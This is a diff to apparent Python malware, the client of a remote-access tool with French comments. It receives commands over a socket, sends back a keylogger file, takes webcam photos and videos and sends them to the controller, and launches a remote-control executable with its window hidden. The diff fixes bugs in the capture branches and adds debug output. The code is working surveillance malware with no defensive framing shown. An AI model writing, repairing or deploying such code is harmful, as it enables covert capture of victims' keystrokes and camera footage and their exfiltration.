@@ -53,6 +53,7 @@ def handle_commands(client_socket):
     try:
         while True:
             command = client_socket.recv(1024).decode('utf-8')
+            print(f"[+] Commande reçue : {command}")
 
             if command == "keylogger":
                 if wait_for_file(KEYLOG_FILE):
@@ -61,36 +62,25 @@ def handle_commands(client_socket):
             elif command == "capture_image":
                 subprocess.run([WEBCAM_EXE, "image"], check=True)
                 capture_folder = os.path.join(BASE_DIR, "captures")
+                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.endswith(".jpg")]
+                if images:
+                    latest_image = max(images, key=os.path.getctime)
+                    if wait_for_file(latest_image):
+                        send_file(client_socket, latest_image, "webcam_capture")
 
-                #Recup de l'image
-                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("webcam_capture_") and f.endswith(".jpg")]
-                if not images:
-                    print("Aucune image trouvée")
-                    return
-
-                latest_image = max(images, key=os.path.getctime)
-
-                if wait_for_file(latest_image):
-                    send_file(client_socket, latest_image, "webcam_capture")
-
-
-                elif command == "capture_video":
-                    subprocess.run([WEBCAM_EXE, "video"], check=True)
-                    capture_folder = os.path.join(BASE_DIR, "captures")
-
-                    #Recup last vidéo
-                    videos = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("webcam_video_") and f.endswith(".avi")]
-                    if not videos:
-                        print("Aucune vidéo trouvée")
-                        return
-
+            elif command == "capture_video":
+                subprocess.run([WEBCAM_EXE, "video"], check=True)
+                capture_folder = os.path.join(BASE_DIR, "captures")
+                videos = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.endswith(".avi")]
+                if videos:
                     latest_video = max(videos, key=os.path.getctime)
-
                     if wait_for_file(latest_video):
                         send_file(client_socket, latest_video, "webcam_capture")
-                
+
             elif command == "remote":
-                    subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                print("[*] remote.exe est lancé !")
+                subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
+                # subprocess.run([REMOTE_EXE], check=True)
 
 
     except Exception as e:
